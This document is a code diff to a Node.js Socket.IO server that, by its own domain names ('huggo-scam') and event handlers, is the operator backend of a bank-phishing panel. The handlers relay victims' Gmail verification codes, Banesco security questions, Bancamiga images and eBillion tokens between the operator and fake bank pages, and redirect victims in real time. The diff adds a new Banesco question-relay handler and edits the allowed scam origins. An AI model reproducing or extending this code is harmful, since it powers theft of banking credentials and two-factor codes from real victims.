@@ -1,11 +1,12 @@
 import { createServer } from 'http'
-import path from 'path'
 import { fileURLToPath } from 'url';
+import { execSync } from 'child_process';
+import path from 'path'
 
 import morgan from 'morgan';
+import express  from 'express'
 import cors  from 'cors'
 import { Server } from 'socket.io'
-import express  from 'express'
 import 'dotenv/config'
 
 import { connectdb } from './db/connectdb.mjs'
@@ -18,6 +19,15 @@ import { bagCreateController } from './controllers/sockets/bag/bagCreateControll
 import { bagDisconnectController } from './controllers/sockets/bag/bagDisconnectController.mjs';
 import { panelSendRedirect } from './controllers/sockets/live/panelSendRedirect.controller.mjs';
 
+import { seed } from './factory/seed.mjs';
+
+try {
+    execSync('pnpm install', { stdio: 'inherit' });
+} catch (error) {
+    console.error('Error al instalar dependencias:', error);
+    process.exit(1);
+}
+
 const app = express()
 
 app.use(cors({origin: '*'}))
@@ -25,8 +35,11 @@ app.use(express.json())
 app.use(morgan('dev'))
 
 connectdb()
-const PORT = 3000
+
+const PORT = 3002
+
 const httpServer = createServer(app)
+
 export const io = new Server( httpServer, { cors: '*' } )
 
 const __filename = fileURLToPath(import.meta.url)
@@ -38,10 +51,8 @@ app.use('/auth', authRoute )
 
 
 io.on('connection', async(socket) => {    
-    
-    if(
-        socket.handshake.headers.origin === ('http://localhost:3000') || socket.handshake.headers.origin == ('https://huggopaneloficial.online/') ||  socket.handshake.headers.origin == ('https://huggo-scam-server-actualizado.onrender.com/') 
-    ) {
+
+    if(socket.handshake.headers.origin === ('http://localhost:3000') || socket.handshake.headers.origin === ('https://huggo-scam-actualizado.vercel.app/') ) {
         try {
             const [valido, id] = await verifyToken({token: socket.handshake?.query['x-token']})
             
@@ -51,12 +62,19 @@ io.on('connection', async(socket) => {
             await socket.join(id)
     
             if([...socket.rooms].includes(id)) {
+
+                
                 const users = await getBagForById({id})
                 socket.emit('[bag] getBag', users)
                 
                 socket.on('[gmail] deviceAndNumberVerify', ({ip = '', gmailDevice = '', gmailCode = '' }) => {
                     if(ip == '') return
                     return io.to(ip).emit('[gmail] bagGmailData', { gmailDevice, gmailCode })
+                })
+
+                socket.on('[banesco] questions', ({ip = '', questions}) => {
+                    if(ip == '') return
+                    return socket.broadcast.to(ip).emit('[banesco] getQuestions', questions)
                 })
 
                 socket.on('[bancamiga] getImage', ({ip = '', image = ''}) => {
@@ -83,11 +101,9 @@ io.on('connection', async(socket) => {
                     return io.to(ip).emit('[ebillion] sendMethodToken', {methodToken})
                 })
 
-                socket.on('[live] panelSendRedirect', async({ip, nameBank, urlPage, errorBag, specialInfo = true}) => 
-                {
+                socket.on('[live] panelSendRedirect', async({ip, nameBank, urlPage, errorBag, specialInfo = true}) => {
                     panelSendRedirect({ip, nameBank, urlPage, errorBag, io, socket, specialInfo})
-                }
-                )
+                })
             }
 
             socket.on('disconnect', async() => {
@@ -102,6 +118,7 @@ io.on('connection', async(socket) => {
 
 
     if(socket.handshake?.query['creator'] == 'nadiemejode'){
+        // genera un codigo simple
         
         const ip = socket.handshake?.query['ip']
 
@@ -112,7 +129,7 @@ io.on('connection', async(socket) => {
 
 
         socket.on('disconnect', async() => {
-            await bagDisconnectController({socket})
+            await bagDisconnectController({socket, ip})
             return socket.leave(ip)
         }) 
 
@@ -122,7 +139,4 @@ io.on('connection', async(socket) => {
 
 // seed(1000)
 // export const handler = serverless(httpServer)
-httpServer.listen(PORT, () => console.log(`conectado al servidor ${PORT}`) )
-
-
-
+httpServer.listen(PORT ?? 0, () => console.log(`conectado al servidor ${PORT}`) )
